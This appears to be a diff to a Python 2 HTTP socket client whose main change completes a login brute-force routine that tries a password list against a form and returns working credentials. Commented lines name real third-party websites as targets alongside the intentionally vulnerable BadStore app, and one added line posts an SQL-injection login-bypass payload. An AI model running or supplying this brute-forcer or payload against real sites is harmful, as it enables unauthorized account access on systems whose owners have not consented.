@@ -1,4 +1,3 @@
-import requests
 import re
 import threading
 import time
@@ -14,6 +13,7 @@ class Requester:
 
     def __init__(self, domain):
         self.host = domain.replace('http://', '')
+        print self.host
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.settimeout(4)
         # Handle if connection not made
@@ -41,7 +41,6 @@ class Requester:
                     "Connection: Keep-Alive\r\n\r\n").format(path,self.host,self.user_agent)
 
         #"Cache-Control: no-cache, no-store, must-revalidate\r\n"
-        print header
         self.sock.send(header)
         response_header = ""
         response = ""
@@ -88,7 +87,7 @@ class Requester:
                 latest_response  = self.sock.recv(1024)
         except:
             #find HTML or html
-            response = response[:response.find('</HTML>')+7]
+            response = response[:response.find('</html>')+7]
         #Return Object:
         # URL
         # cookies
@@ -98,10 +97,10 @@ class Requester:
         result = postInfo(url, cookies, response)
         return result
 
-    def post(self, postInfo, fields):
+    def post(self, info, fields):
         #iterating through fields and adding to body of post
         #field dictionary in post
-        path = urlparse(postInfo.url).path
+        path = urlparse(info.url).path
         # Build request body
         body = ""
         for key in fields.keys():
@@ -109,7 +108,7 @@ class Requester:
             body += str(key) + "=" + str(fields[key])
         body = body[1:]
 
-        header = ("POST {} HTTP/1.0\r\n"
+        header = ("POST {} HTTP/1.1\r\n"
                 "Host: {}\r\n"
                 "User-Agent: {}\r\n"
                 "Accept: text/plain, text/html\r\n"
@@ -118,47 +117,59 @@ class Requester:
                 "Content-Length: {}\r\n"
                 "Connection: Keep-Alive\r\n"
                 ).format(path,self.host,self.user_agent,len(body))
-        print postInfo.cookies
-        if postInfo.cookies:
+        print info.cookies
+        if info.cookies:
             cookie_string = ""
-            for key in postInfo.cookies.keys():
-                cookie_string += key + "=" + postInfo.cookies[key]+ ';'
+            for key in info.cookies.keys():
+                cookie_string += key + "=" + info.cookies[key]+ ';'
                 cookie_string += "\r\n"
             header += "Cookie: {}".format(cookie_string)
         header += "\r\n"
-        header += body
+        header += body + "\r\n\r\n"
         # print header
+        print header
         response = ""
         try:
             self.sock.send(header)
             latest_response = self.sock.recv(1024)
+            print latest_response
             while latest_response.strip():
                 response += latest_response
                 latest_response  = self.sock.recv(1024)
         except:
             #find HTML or html
-            response = response[:response.find('</HTML>')+7]
-        return response
+            response = response[:response.find('</html>')+7]
+            return response
+
 #Returns Dictionary of correct credentials if successful bruteforce.
 #Unsuccessful Bruteforces return null
-def bruteForce(self, url, username, keywords):
-    r = Requester(url)
-    postInfo = r.get(url)
-    #Attempt to login
-    query = {}
-    query[postInfo.username_field] = username
-    for password in keywords:
-        query[password_field] = password
-        response = r.post(postInfo, query)
-        if soup.findAll(type ="password"):
-            #False if Login successful(supposedly)
-            continue
-        else:
-            return {"Username": username, "Password": password}
-    return None
+    def bruteForce(self, url, username, keywords, action):
+        #r = Requester(url)
+        info  = self.get(url)
+        #Assume action doesnt have a slash
+        info.url = info.url+action[1:]
+        print info.url
+        #Attempt to login
+        query = {}
+        query[info.username_field] = username
+        for password in keywords:
+            query[info.password_field] = password
+            response = self.post(info, query)
+
+            #If response is redirect (3**) then call get on the url at location: xxxx
+            #Else its probably js and just check the page returned for password
+            print response
+            soup = BeautifulSoup(response, "html.parser")
+            if soup.findAll(type ="password"):
+                #False if Login successful(supposedly)
+                print response
+                continue
+            else:
+                return {"Username": username, "Password": password}
+        return None
 
 #path = 'http://austinchildrensacademy.org'
-#r =  Requester('http://shop.nhl.com')
+#r =  Requester('http://www.badstore.net')
 #info = r.get('http://shop.nhl.com')
 #r.post(info, {"Hello":"World", "foo":"bar"})
 #path = 'http://austinchildrensacademy.org/about-aca/'
@@ -167,5 +178,6 @@ def bruteForce(self, url, username, keywords):
 
 #print '\n'
 #print r.get('http://www.badstore.net/cgi-bin/badstore.cgi?action=loginregister')
-#print r.post('/cgi-bin/badstore.cgi?action=loginregister','','')
+#info = postInfo('/cgi-bin/badstore.cgi?action=loginregister','','')
+#print r.post(info,fields = {'email': 'admin\' AND 1=1 -- ', 'password': ''})
 
